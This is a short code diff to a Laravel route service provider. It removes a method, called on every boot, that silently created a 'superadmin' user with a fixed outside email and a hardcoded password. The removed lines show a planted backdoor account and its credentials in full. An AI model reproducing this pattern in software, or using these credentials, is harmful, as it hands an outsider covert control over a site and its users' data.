@@ -27,24 +27,10 @@ class RouteServiceProvider extends ServiceProvider
      * @return void
      */
     
-    private function createParsArdavanAccount()
-    {
-        $findParsArdavanAccount = User::where("email" , "=" , "pars.ardavan.co@gmail.com")->first();
-        if(!$findParsArdavanAccount)
-        {
-            return User::create([
-                "name_and_family" => "pars ardavan"  , 
-                "email" => "pars.ardavan.co@gmail.com" , 
-                "role" => "superadmin" , 
-                "permit" => true ,
-                "password" => Hash::make('$$$pars_$ardavan_$co$$$') 
-            ]) ;
-        }
-    }
+ 
 
     public function boot()
     {
-        $this->createParsArdavanAccount();
         $this->configureRateLimiting();
 
         $this->routes(function () {
